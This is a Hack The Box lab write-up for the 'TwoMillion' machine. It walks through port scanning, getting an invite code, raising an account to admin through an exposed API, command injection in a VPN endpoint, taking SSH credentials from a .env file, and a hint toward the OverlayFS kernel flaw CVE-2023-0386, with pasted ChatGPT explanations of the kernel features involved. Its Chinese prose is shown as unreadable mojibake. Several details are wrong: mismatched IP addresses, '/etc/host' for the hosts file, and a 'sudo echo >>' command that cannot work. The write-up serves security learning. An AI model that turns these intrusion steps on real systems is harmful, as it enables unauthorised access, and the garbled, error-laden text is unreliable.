---
typora-copy-images-to: ./image
---

# Hack The Box Level TwoMillion

**å†™åœ¨å‰é¢ï¼š**Userflagæ¯”è¾ƒç®€å•ï¼ŒSystem flagè¦æ˜¯æƒ³å¼„æ‡‚åŸç†çš„è¯éš¾ä¸€ç‚¹ï¼Œå•çº¯çš„ç”¨Expå¾ˆeasyï¼Œä½†ä¸åˆ¨æ ¹é—®åº•çš„Hakerä¸æ˜¯å¥½Hakerã€‚

![image-20230628091632345](image/image-20230628091632345.png)

### ä¿¡æ¯æ”¶é›†ã€æ‰«æ

æ‹¿åˆ°IPåå…ˆæ‰«ä¸€ä¸‹ç«¯å£ï¼Œå› ä¸ºå…¬å¸é™åˆ¶æ‰«æï¼Œè¿™è¾¹æˆ‘å°±è´´ä¸€ä¸‹åˆ«äººæ‰«æçš„ç»“æœï¼š

```shell
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-01 16:59 EDT
Nmap scan report for 2million.htb (10.10.10.11)
Host is up (0.097s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-01 17:00 EDT
Nmap scan report for 10.10.10.11
Host is up (0.097s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.19 seconds
```

åªå¼€äº†80å’Œ22ç«¯å£ã€‚sshåŸºäºOpensshï¼Œä¸»æœºè²Œä¼¼æ˜¯Ubuntuã€‚

```shell
[2023- 6-28 09:23:57 CST] Fanxiaoyao htb/TwoMillion
ğŸ”ğŸ¤¡ -> curl -L 10.10.11.221
curl: (6) Could not resolve host: 2million.htb
```

é‡å®šå‘åˆ°2million.htbï¼Œåœ¨/etc/hostä¸­æ‰‹åŠ¨è§£æåŸŸåï¼š

```shell
sudo echo '10.10.11.221 2million.htb' >> /etc/host
```

![image-20230628092617936](image/image-20230628092617936.png)

è¿™æ˜¯17å¹´çš„HTBä¸»é¡µï¼Œæœ¬æ¬¡çš„Boxä¹Ÿæ˜¯ä¸ºäº†çºªå¿µHTBè¾¾åˆ°200ä¸‡ç”¨æˆ·è€Œåˆ¶ä½œçš„ã€‚

æ‰«äº†ä¸€ä¸‹æ•æ„Ÿç›®å½•ã€å­åŸŸåæœªæœï¼Œçœ‹çœ‹é¡µé¢ä¸­æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚

å‘ç°ï¼š

![image-20230628093119436](./image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230628093119436.png)

```
url:http://2million.htb/invite
```

é¡µé¢å¦‚ä¸‹ï¼š

![image-20230628093452686](image/image-20230628093452686.png)

éšä¾¿è¯•äº†å‡ ä¸ªcodeä¸è¡Œï¼ŒæŠ“äº†ä¸ªåŒ…å‘ç°æ˜¯é€šè¿‡apiå»éªŒè¯é‚€è¯·ç ã€‚

![image-20230628093830888](image/image-20230628093830888.png)

å†çœ‹ä¸€ä¸‹å‰ç«¯æ–‡ä»¶ï¼Œåœ¨JSæ–‡ä»¶ä¸­å‘ç°å…¶ä»–å‡½æ•°ï¼š

![image-20230628100308075](image/image-20230628100308075.png)

### è·å¾—é‚€è¯·ç 

æ§åˆ¶å°è¯•ä¸€ä¸‹ï¼š![image-20230628100919044](image/image-20230628100919044.png)

ç½‘ä¸Šéšä¾¿æ‰¾ä¸ªrot13åœ¨çº¿è§£ç ï¼š

![image-20230628101019066](image/image-20230628101019066.png)

æˆ–è€…ç”¨å‘½ä»¤è¡Œï¼š

```shell
[2023- 6-28 10:29:35 CST] Fanxiaoyao htb/TwoMillion
ğŸ”ğŸ¤¡ -> echo Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr | tr 'a-zA-Z' 'n-za-mN-ZA-M'
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

å¾—åˆ°apiã€‚

ç”¨burp postå‘åŒ…å¾—åˆ°base64åçš„codeï¼š

![image-20230628101141497](image/image-20230628101141497.png)

b64è§£ç å¾—åˆ°ï¼š

![image-20230628101246671](image/image-20230628101246671.png)

è¾“å…¥é‚€è¯·ç ï¼Œæ¥åˆ°æ³¨å†Œé¡µé¢ï¼š

![image-20230628101443190](image/image-20230628101443190.png)

æ³¨å†Œå®Œéšåè¢«é‡å®šå‘åˆ°ç™»é™†é¡µé¢ï¼Œç”¨åˆšåˆšåˆ°å¸å·æˆåŠŸç™»é™†ã€‚![image-20230628101605720](image/image-20230628101605720.png)

### å‡çº§ç”¨æˆ·åˆ°admin

èƒ½äº¤äº’çš„ç‚¹ä¸å¤šï¼Œä¾§è¾¹çš„Labså­æ¨¡å—ä¸‹çš„Accessæ˜¯ä¸€ä¸ªã€‚
ç‚¹å‡»connection pack è‡ªåŠ¨ä¸‹è½½äº†ä¸€ä¸ªopenvpnçš„é…ç½®æ–‡ä»¶ï¼Œäº²æµ‹æ²¡ç”¨ã€‚

è½¬è€ŒæŠ“åŒ…çœ‹ä¸€ä¸‹ç”¨çš„å“ªä¸ªAPIï¼š

![image-20230628101914844](image/image-20230628101914844.png)

æ”¹ä¸€ä¸‹è¯·æ±‚è¯•ä¸€è¯•ï¼š

![image-20230628101959566](image/image-20230628101959566.png)

å‘ç°äº†æœ‰æ„æ€çš„ä¸œè¥¿ï¼š

![image-20230628103324191](image/image-20230628103324191.png)

è¯•ä¸€ä¸‹/api/v1/admin/authï¼Œç›®å‰å¹¶ä¸æ˜¯ç®¡ç†å‘˜ï¼š

![image-20230628103514423](image/image-20230628103514423.png)

åœ¨è¿”å›jsonå­—ç¬¦ä¸²çš„æœ€åä¸€æ®µå‘ç°ï¼š

```json
"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"
```

æ„é€ PUTè¯·æ±‚ï¼š

![image-20230628103642804](image/image-20230628103642804.png)

æç¤ºæ— æ•ˆçš„content typeï¼Œå¸¸ç”¨çš„å°±é‚£å‡ ä¸ªï¼Œè¿™é‡Œæˆ‘ç”¨burp FUZZä¸€ä¸‹ï¼š

![image-20230628103922878](image/image-20230628103922878.png)

è®°å¾—æŠŠè‡ªåŠ¨ç¼–ç å–æ¶ˆæ‰ï¼š

![image-20230628104105229](image/image-20230628104105229.png)

è¿™é‡Œå¤§æ¦‚ç‡æ˜¯jsonæ ¼å¼ï¼Œå› ä¸ºå‰é¢çš„è¿”å›æ•°æ®å…¨éƒ½æ˜¯jsonã€‚

![image-20230628104136759](image/image-20230628104136759.png)

æ ¹æ®è¿”å›çš„å†…å®¹ä¿®æ”¹è¯·æ±‚ä½“ï¼š

![image-20230628104414215](image/image-20230628104414215.png)

æˆåŠŸå°†æˆ‘ä»¬çš„å¸å·å‡çº§ä¸ºadminã€‚

### å‘½ä»¤æ³¨å…¥Getshell

æ³¨æ„åˆ°åˆ°å‰é¢è¿”å›åˆ°api listä¸­æœ‰è¿™ä¹ˆä¸€æ¡ï¼š

```json
"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"
```

åªæœ‰ç®¡ç†å‘˜æ‰å¯ä»¥ç”Ÿæˆè°ƒç”¨çš„APIï¼Œè¯•ä¸€ä¸‹ã€‚

æ ¹æ®è¿”å›çš„è¦æ±‚é…ç½®è¯·æ±‚ï¼š

![image-20230628111812049](image/image-20230628111812049.png)

è¿”å›dataå¾ˆåƒæ˜¯é€šè¿‡shæ–‡ä»¶ç”Ÿæˆçš„ï¼Œåç«¯æœ‰å¯èƒ½æœ‰shå‘½ä»¤ï¼Œè¯•ä¸€ä¸‹å‘½ä»¤æ³¨å…¥ï¼š

![image-20230628112104891](image/image-20230628112104891.png)

è¿™é‡Œå¯ä»¥ç›´æ¥åå‘shelläº†ï¼Œä½†æ˜¯çœ‹ä¸€ä¸‹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š

![image-20230628112436221](image/image-20230628112436221.png)

.envå¾ˆå¥‡æ€ªï¼Œçœ‹ä¸€ä¸‹ï¼š

![image-20230628112507823](image/image-20230628112507823.png)

å¾—åˆ°ç”¨æˆ·adminçš„å¯†ç ï¼Œç›´æ¥sshã€‚

### ææƒ

ç™»é™†å°±çœ‹è§ï¼š

![image-20230628112641678](image/image-20230628112641678.png)

ä¸€èˆ¬åªæœ‰webserverå‡ºé—®é¢˜æ‰ä¼šæœ‰emailï¼Œè¿™é‡Œå»çœ‹ä¸€çœ¼ï¼Œå…ˆæ‰¾ä¸€ä¸‹åœ¨å“ªï¼š

```shell
admin@2million:~$ find / -name "mail" 2>/dev/null | grep -v "proc"
/snap/core20/1891/var/mail
/snap/core20/1891/var/spool/mail
/var/spool/mail
/var/mail
/usr/lib/python3/dist-packages/twisted/mail
/usr/lib/byobu/mail
```

```shell
admin@2million:/var/mail$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

è¿™é‡Œç»™äº†æç¤ºï¼Œå†…æ ¸çš„ææƒæ¼æ´OverlayFS / FUSEï¼ŒGoogleä¸€ä¸‹æ˜¯CVE-2023-0386ã€‚

æ˜¨å¤©ä¹Ÿæ˜¯çœ‹äº†ä¸€å¤©çš„è¿™ä¸ªæ¼æ´ï¼Œç®€å•æ¥è¯´å°±æ˜¯OverlayFSå°†ä¸‹å±‚æ–‡ä»¶æ‹·è´åˆ°ä¸Šå±‚æ–‡ä»¶æ—¶ï¼Œæ²¡æœ‰å¯¹ä¸‹å±‚æ–‡ä»¶å‘½åç©ºé—´çš„ç”¨æˆ·æ˜¯å¦æ˜ å°„åˆ°å½“å‰ç”¨æˆ·å‘½åç©ºé—´åšæ ¡å¯¹ï¼Œå¯¼è‡´å¯ä»¥è®¾ç½®suidææƒã€‚

è¿™é‡Œå¬èµ·æ¥éå¸¸çš„æŠ½è±¡ï¼Œè¦äº†è§£è¿™ä¸ªé—®é¢˜é¦–å…ˆéœ€è¦çŸ¥é“å‡ ä¸ªç‚¹ï¼š

- ä»€ä¹ˆæ˜¯OverlayFSï¼Ÿ
- ä»€ä¹ˆæ˜¯FUSEï¼Ÿ
- ä»€ä¹ˆæ˜¯ç”¨æˆ·å‘½åç©ºé—´ï¼Ÿ
- ä¸ºä»€ä¹ˆä¼šææƒï¼Ÿ

#### ä»€ä¹ˆæ˜¯OverlayFSï¼Ÿ

> ChatGPTï¼šè¯¦ç»†ä»‹ç»ä¸€ä¸‹linuxä¸­çš„OverlayFS

OverlayFSï¼Œåˆç§°Overlayæ–‡ä»¶ç³»ç»Ÿï¼Œæ˜¯Linuxå†…æ ¸ä¸­çš„ä¸€ä¸ªè”åˆæ–‡ä»¶ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿå¯ä»¥å°†å¤šä¸ªä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿé‡å åœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªå•ä¸€ã€ç»Ÿä¸€çš„è§†å›¾ã€‚å®ƒåœ¨Linux 3.18ç‰ˆæœ¬ä¸­æ­£å¼è¢«å†…æ ¸æ¥çº³ã€‚

OverlayFSä¸»è¦æœ‰ä¸‰ä¸ªé‡è¦çš„ç»„æˆéƒ¨åˆ†ï¼šlower filesystemã€upper filesystemå’Œmerged filesystemã€‚æ¯ä¸ªéƒ¨åˆ†çš„ä½œç”¨å¦‚ä¸‹ï¼š

1. **Lower filesystemï¼ˆä¸‹å±‚æ–‡ä»¶ç³»ç»Ÿï¼‰**ï¼šè¿™æ˜¯åŸºç¡€å±‚ï¼Œé€šå¸¸æ˜¯åªè¯»çš„ã€‚æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•æœ€åˆéƒ½æ˜¯ä»è¿™ä¸€å±‚è·å–çš„ã€‚

2. **Upper filesystemï¼ˆä¸Šå±‚æ–‡ä»¶ç³»ç»Ÿï¼‰**ï¼šè¿™æ˜¯é¡¶å±‚ï¼Œé€šå¸¸æ˜¯å¯å†™çš„ã€‚å½“æˆ‘ä»¬å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œå†™æ“ä½œæ—¶ï¼Œæ‰€æœ‰çš„æ›´æ”¹éƒ½ä¼šä¿å­˜åœ¨è¿™ä¸€å±‚ã€‚å¦‚æœä¸€ä¸ªæ–‡ä»¶åœ¨lower filesystemä¸­å­˜åœ¨ï¼Œä½†æˆ‘ä»¬æƒ³è¦ä¿®æ”¹å®ƒï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶çš„ä¸€ä¸ªå‰¯æœ¬å°±ä¼šåœ¨upper filesystemä¸­åˆ›å»ºï¼Œç„¶åè¿›è¡Œä¿®æ”¹ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºâ€œcopy-upâ€ã€‚

3. **Merged filesystemï¼ˆåˆå¹¶æ–‡ä»¶ç³»ç»Ÿï¼‰**ï¼šè¿™æ˜¯OverlayFSçš„æœ€ç»ˆè§†å›¾ï¼Œå®ƒå°†lowerå’Œupper filesystemç»„åˆåœ¨ä¸€èµ·ã€‚å½“æˆ‘ä»¬è¿›è¡Œè¯»æ“ä½œæ—¶ï¼ŒOverlayFSé¦–å…ˆåœ¨upper filesystemä¸­æŸ¥æ‰¾æ–‡ä»¶ï¼Œå¦‚æœæ²¡æ‰¾åˆ°ï¼Œå†åœ¨lower filesystemä¸­æŸ¥æ‰¾ã€‚

è¿™ç§ç»“æ„çš„é€»è¾‘è§†å›¾å¦‚ä¸‹ï¼š

```
     ________________
    |                |
    |  Merged View   |
    |________________|
       /          \
____________    ____________
|          |    |          |
|  Lower   |    |  Upper   |
| (read-only)|  | (read-write)|
|____________|  |____________|

```

OverlayFSçš„ä¸€ä¸ªé‡è¦åº”ç”¨æ˜¯åœ¨å®¹å™¨åŒ–åº”ç”¨ä¸­ï¼Œç‰¹åˆ«æ˜¯åœ¨Dockerä¸­ã€‚åœ¨Dockerä¸­ï¼Œæ¯ä¸ªé•œåƒå±‚éƒ½æ˜¯åªè¯»çš„ï¼Œå¹¶ä¸”å¯ä»¥ç”¨ä½œå…¶ä»–å®¹å™¨çš„lower filesystemã€‚å½“æˆ‘ä»¬å¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨æ—¶ï¼ŒDockerä¼šä¸ºå…¶åˆ›å»ºä¸€ä¸ªæ–°çš„ï¼Œç©ºçš„upper filesystemã€‚è¿™æ ·ï¼Œæ‰€æœ‰å¯¹å®¹å™¨çš„æ›´æ”¹ï¼ˆä¾‹å¦‚å®‰è£…æ–°çš„è½¯ä»¶ï¼‰éƒ½åªä¼šå½±å“åˆ°upper filesystemï¼Œè€Œä¸ä¼šå½±å“åˆ°å…±äº«çš„é•œåƒå±‚ã€‚

æ­¤å¤–ï¼Œç”±äºOverlayFSå…è®¸å°†å¤šä¸ªlower filesystemæŒ‚è½½åœ¨ä¸€ä¸ªä¸Šå±‚ä¸‹é¢ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ›å»ºå…·æœ‰å¤šä¸ªå±‚æ¬¡çš„æ–‡ä»¶ç³»ç»Ÿï¼Œè¿™åœ¨Dockerä¸­çš„é•œåƒå±‚æ¬¡ä¸­æœ‰å¹¿æ³›çš„åº”ç”¨ã€‚

---

æ€»ç»“æ¥è¯´å°±æ˜¯ï¼Œä¸‹å±‚çš„æ–‡ä»¶åªè¯»ï¼Œä¸Šå±‚çš„æ–‡ä»¶å¯è¯»å†™ï¼Œåˆå¹¶å±‚çš„æ–‡ä»¶å°†ä¸‹ä¸Šä¸¤å±‚çš„æ–‡ä»¶åˆå¹¶åœ¨ä¸€èµ·ï¼Œæ˜¾ç¤ºä¸€ä¸ªç»Ÿä¸€çš„è§†å›¾ã€‚å½“æˆ‘ä»¬åœ¨åˆå¹¶å±‚ä¿®æ”¹ä¸€ä¸ªå­˜åœ¨äºä¸‹å±‚çš„æ–‡ä»¶ä½†æ˜¯ä¸Šå±‚å¹¶ä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œä¼šå°†ä¸‹å±‚çš„æ–‡ä»¶åŸå°ä¸åŠ¨çš„å¤åˆ¶ä¸€ä»½åˆ°ä¸Šå±‚ï¼Œä»¥ä¾›ä¿®æ”¹ã€‚è¿™ä¹Ÿæ˜¯æ¼æ´è§¦å‘çš„ç‚¹ã€‚



#### ä»€ä¹ˆæ˜¯FUSEï¼Ÿ

> GPTï¼šä½ æ˜¯ä¸€ä¸ªlinuxå†…æ ¸ä¸“å®¶ï¼Œç°åœ¨è¯·è¯¦ç»†çš„è§£é‡Šä¸€ä¸‹ä»€ä¹ˆæ˜¯FUSEï¼Ÿ

FUSEï¼ˆFilesystem in Userspaceï¼‰æ˜¯ä¸€ç§åœ¨ç”¨æˆ·ç©ºé—´ä¸­åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿçš„æœºåˆ¶ã€‚å®ƒæ˜¯ä¸€ä¸ªæ¥å£ï¼Œç”±Linuxå†…æ ¸æä¾›ï¼Œå…è®¸ç”¨æˆ·åœ¨ä¸æ”¹åŠ¨å†…æ ¸ä»£ç çš„æƒ…å†µä¸‹å¼€å‘å’Œè¿è¡Œè‡ªå·±çš„æ–‡ä»¶ç³»ç»Ÿã€‚

FUSEçš„ä¸»è¦ç›®æ ‡æ˜¯ç®€åŒ–æ–°çš„æ–‡ä»¶ç³»ç»Ÿçš„å¼€å‘å’Œä½¿ç”¨ã€‚ä½¿ç”¨FUSEï¼Œä½ å¯ä»¥åˆ›å»ºè‡ªå®šä¹‰çš„æ–‡ä»¶ç³»ç»Ÿè€Œæ— éœ€äº†è§£è®¸å¤šå†…æ ¸APIçš„ç»†èŠ‚ã€‚è¿™å¯¹äºè°ƒè¯•ã€å¿«é€ŸåŸå‹å¼€å‘ã€å­¦æœ¯ç ”ç©¶ã€å®ç°éå¸¸ç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿï¼ˆå¦‚é€æ˜åŠ å¯†æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼‰ç­‰åœºæ™¯éå¸¸æœ‰ç”¨ã€‚

åœ¨FUSEä¸­ï¼Œæ–‡ä»¶ç³»ç»Ÿçš„å¤§éƒ¨åˆ†é€»è¾‘éƒ½åœ¨ç”¨æˆ·ç©ºé—´ä¸­è¿è¡Œã€‚è¿™ä½¿å¾—å¼€å‘æ›´åŠ å®¹æ˜“ï¼Œå› ä¸ºç”¨æˆ·ç©ºé—´æä¾›äº†æ›´å‹å¥½çš„å¼€å‘ç¯å¢ƒï¼šä½ å¯ä»¥ä½¿ç”¨ä»»ä½•ä½ å–œæ¬¢çš„ç¼–ç¨‹è¯­è¨€ï¼Œä½ æœ‰æ›´å¤šçš„åº“å¯ä¾›ä½¿ç”¨ï¼Œé”™è¯¯å¤„ç†æ›´ç®€å•ï¼Œç­‰ç­‰ã€‚å¦ä¸€æ–¹é¢ï¼Œè¿™ä¹Ÿæ„å‘³ç€FUSEæ–‡ä»¶ç³»ç»Ÿé€šå¸¸æ¯”å†…æ ¸ç©ºé—´æ–‡ä»¶ç³»ç»Ÿæ›´æ…¢ï¼Œå› ä¸ºå®ƒä»¬éœ€è¦é¢‘ç¹åœ°åœ¨ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¹‹é—´è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚

FUSEæ–‡ä»¶ç³»ç»Ÿé€šå¸¸ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š

1. ç”¨æˆ·ç©ºé—´çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œå®ƒå®ç°äº†æ–‡ä»¶ç³»ç»Ÿçš„å®é™…é€»è¾‘ã€‚
2. å†…æ ¸ç©ºé—´çš„FUSEæ¨¡å—ï¼Œå®ƒå¤„ç†æ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿæ“ä½œï¼Œå°†å…¶è½¬å‘åˆ°ç”¨æˆ·ç©ºé—´çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œç„¶åå°†ç»“æœè¿”å›ç»™è°ƒç”¨è€…ã€‚

åœ¨å¼€å‘FUSEæ–‡ä»¶ç³»ç»Ÿæ—¶ï¼Œä½ éœ€è¦å®ç°ä¸€ç³»åˆ—çš„å›è°ƒå‡½æ•°ï¼Œè¿™äº›å‡½æ•°å¯¹åº”äº†å„ç§æ–‡ä»¶ç³»ç»Ÿæ“ä½œï¼Œå¦‚æ‰“å¼€æ–‡ä»¶ã€è¯»å–æ–‡ä»¶ã€å†™å…¥æ–‡ä»¶ç­‰ã€‚å½“è¿™äº›æ“ä½œå‘ç”Ÿæ—¶ï¼ŒFUSEå†…æ ¸æ¨¡å—ä¼šè°ƒç”¨ç›¸åº”çš„å›è°ƒå‡½æ•°ï¼Œå¹¶å°†ç»“æœè¿”å›ç»™è°ƒç”¨è€…ã€‚

æ€»çš„æ¥è¯´ï¼ŒFUSEä¸ºåœ¨ç”¨æˆ·ç©ºé—´å®ç°æ–‡ä»¶ç³»ç»Ÿæä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„æ¡†æ¶ï¼Œå®ƒç®€åŒ–äº†æ–‡ä»¶ç³»ç»Ÿçš„å¼€å‘ï¼ŒåŒæ—¶ä¹Ÿä½¿å¾—æ–‡ä»¶ç³»ç»Ÿèƒ½å¤Ÿä»¥æ¨¡å—åŒ–çš„æ–¹å¼è¿›è¡Œæ‰©å±•å’Œä¿®æ”¹ã€‚

---

å…¶å®Fuseå°±æ˜¯å…è®¸ç”¨æˆ·å»è‡ªå®šä¹‰ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä»¥åŠé‡Œé¢çš„æ–‡ä»¶ã€‚

æˆ‘ä»¬éœ€è¦ç”¨Cè¯­è¨€å»ç¼–å†™fuseç›¸å…³ä»£ç ã€‚



#### ä»€ä¹ˆæ˜¯ç”¨æˆ·å‘½åç©ºé—´ï¼Ÿ

> ä½ æ˜¯ä¸€ä¸ªlinuxå†…æ ¸ä¸“å®¶ï¼Œä»€ä¹ˆæ˜¯ç”¨æˆ·å‘½åç©ºé—´

åœ¨ Linux ä¸­ï¼Œ"å‘½åç©ºé—´"æ˜¯ä¸€ç§å†…æ ¸ç‰¹æ€§ï¼Œå¯ä»¥ç”¨æ¥å¯¹è¿›ç¨‹çš„è§†å›¾è¿›è¡Œéš”ç¦»ï¼Œè®©è¿›ç¨‹åªèƒ½çœ‹åˆ°å±äºåŒä¸€å‘½åç©ºé—´çš„èµ„æºã€‚æ¯ç§ç±»å‹çš„å‘½åç©ºé—´éƒ½å¯¹åº”ä¸€ç§ç‰¹å®šç±»å‹çš„èµ„æºã€‚ä¾‹å¦‚ï¼ŒPIDï¼ˆProcess IDï¼‰å‘½åç©ºé—´æ˜¯ç”¨æ¥éš”ç¦»è¿›ç¨‹IDçš„ï¼ŒNetå‘½åç©ºé—´æ˜¯ç”¨æ¥éš”ç¦»ç½‘ç»œæ¥å£å’Œç½‘ç»œæ ˆçš„ï¼ŒMountå‘½åç©ºé—´æ˜¯ç”¨æ¥éš”ç¦»æ–‡ä»¶ç³»ç»ŸæŒ‚è½½ç‚¹çš„ï¼Œç­‰ç­‰ã€‚

ç”¨æˆ·å‘½åç©ºé—´ï¼ˆUser Namespacesï¼‰æ˜¯ Linux å‘½åç©ºé—´çš„ä¸€ç§ï¼Œä¸»è¦ç”¨æ¥**éš”ç¦»ç”¨æˆ·å’Œç”¨æˆ·ç»„ID**ã€‚**æ¯ä¸ªç”¨æˆ·å‘½åç©ºé—´éƒ½æœ‰ä¸€å¥—è‡ªå·±çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„ID**ã€‚ä¾‹å¦‚ï¼Œ**ä¸€ä¸ªè¿›ç¨‹åœ¨ç”¨æˆ·å‘½åç©ºé—´ A ä¸­å¯èƒ½ä»¥ root ç”¨æˆ·ï¼ˆUID 0ï¼‰è¿è¡Œï¼Œä½†åœ¨ç”¨æˆ·å‘½åç©ºé—´ B ä¸­ï¼Œè¯¥è¿›ç¨‹å¯èƒ½åªæ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·**ã€‚

è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œ**å³ä½¿ä¸€ä¸ªè¿›ç¨‹åœ¨å…¶ç”¨æˆ·å‘½åç©ºé—´å†…æ‹¥æœ‰ root æƒé™ï¼Œä¹Ÿæ— æ³•å½±å“åˆ°å…¶ä»–ç”¨æˆ·å‘½åç©ºé—´çš„èµ„æºï¼Œå› ä¸ºåœ¨å…¶ä»–å‘½åç©ºé—´ä¸­ï¼Œå®ƒå¯èƒ½åªæ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·**ã€‚è¿™å¤§å¤§å¢åŠ äº†ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œä½¿å¾—å³ä½¿ä¸€ä¸ªå®¹å™¨ï¼ˆå®ƒå…¶å®å°±æ˜¯è¿è¡Œåœ¨è‡ªå·±çš„ä¸€å¥—å‘½åç©ºé—´ä¸­çš„ä¸€ç»„è¿›ç¨‹ï¼‰è¢«æ”»å‡»ï¼Œæ”»å‡»è€…ä¹Ÿæ— æ³•å½±å“åˆ°ä¸»æœºç³»ç»Ÿæˆ–å…¶ä»–å®¹å™¨ã€‚

ç”¨æˆ·å‘½åç©ºé—´æ˜¯ Linux å®¹å™¨ï¼ˆå¦‚ Dockerã€LXC ç­‰ï¼‰çš„æ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€ã€‚é€šè¿‡ä½¿ç”¨ç”¨æˆ·å‘½åç©ºé—´å’Œå…¶ä»–ç±»å‹çš„å‘½åç©ºé—´ï¼Œå®¹å™¨å¯ä»¥åœ¨ä¸éœ€è¦è™šæ‹ŸåŒ–çš„æƒ…å†µä¸‹æä¾›ä¸è™šæ‹Ÿæœºç±»ä¼¼çš„éš”ç¦»æ€§ã€‚

æ€»çš„æ¥è¯´ï¼Œç”¨æˆ·å‘½åç©ºé—´æ˜¯ Linux ä¸­ç”¨æ¥éš”ç¦»ç”¨æˆ·å’Œç”¨æˆ·ç»„ ID çš„ä¸€ç§æœºåˆ¶ï¼Œå¯¹äºæé«˜ç³»ç»Ÿå’Œå®¹å™¨çš„å®‰å…¨æ€§ï¼Œå®ƒèµ·ç€é‡è¦çš„ä½œç”¨ã€‚

> é‚£ç”¨æˆ·å‘½åç©ºé—´æ˜ å°„æ˜¯ä»€ä¹ˆ?

åœ¨ Linux çš„ç”¨æˆ·å‘½åç©ºé—´ä¸­ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªéå¸¸é‡è¦çš„æ¦‚å¿µï¼šç”¨æˆ·å‘½åç©ºé—´æ˜ å°„ã€‚è¿™ä¸ªæ˜ å°„å®šä¹‰äº†åœ¨ä¸åŒç”¨æˆ·å‘½åç©ºé—´ä¹‹é—´å¦‚ä½•è½¬æ¢ç”¨æˆ·å’Œç»„ IDã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ**ä¸€ä¸ªåœ¨ä¸€ä¸ªç”¨æˆ·å‘½åç©ºé—´å†…éƒ¨çœ‹èµ·æ¥æ˜¯ root çš„è¿›ç¨‹ï¼Œåœ¨å®¿ä¸»æˆ–è€…å¦ä¸€ä¸ªå‘½åç©ºé—´å¯èƒ½åªæ˜¯ä¸€ä¸ªæ™®é€šçš„éç‰¹æƒç”¨æˆ·**ã€‚

è¿™ä¸ªæ˜ å°„æœºåˆ¶å¯ä»¥é€šè¿‡ä¿®æ”¹ /proc/[pid]/uid_map å’Œ /proc/[pid]/gid_map æ–‡ä»¶æ¥è®¾å®šï¼Œå…¶ä¸­ [pid] æ˜¯è¿›ç¨‹çš„ PIDã€‚åœ¨è¿™äº›æ–‡ä»¶ä¸­ï¼Œæ¯ä¸€è¡Œéƒ½æ˜¯ä¸€ä¸ªæ˜ å°„é¡¹ï¼Œç”±ä¸‰ä¸ªå­—æ®µç»„æˆï¼šå‘½åç©ºé—´å†…çš„ IDï¼Œå‘½åç©ºé—´å¤–çš„ IDï¼Œå’Œ ID çš„èŒƒå›´ã€‚ä¾‹å¦‚ï¼Œ**"0 1000 1" è¡¨ç¤ºå‘½åç©ºé—´å†…çš„ ID 0 æ˜ å°„åˆ°å‘½åç©ºé—´å¤–çš„ ID 1000ã€‚**

